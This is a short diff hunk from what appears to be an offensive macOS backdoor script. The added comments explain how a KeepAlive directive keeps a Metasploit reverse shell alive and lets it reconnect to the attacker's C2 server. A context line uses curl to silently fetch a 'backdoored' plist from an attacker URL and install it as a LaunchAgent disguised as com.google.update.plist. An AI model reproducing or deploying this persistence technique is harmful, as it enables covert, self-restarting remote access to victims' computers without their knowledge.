@@ -34,7 +34,9 @@ sleep 2
 # Persistence as LaunchAgents. Our backdoor will call us after user login.
 # If we kill session once established, victim neeeds to log off and log in again to get another shell,
 # or just reboot. Instead set KeepAlive directive in your plist file to makes an unbreakable shell
-# that persist also if you kill it from metasploit or if app crash it restarts itself
+# that persist also if you kill it from metasploit or if app crash it restarts itself. Also using KeepAlive
+# permits you to establish a session also if your c2c is down: when it goes up, shell is obtained. 
+# It's useful if you don't have a C2C server and wants a persistence backdoored victim calls your desktop pc
 #
 # Download and write backdoored plist file in right directory
 curl -s -k $PLISTURL -o ~/Library/LaunchAgents/com.google.update.plist
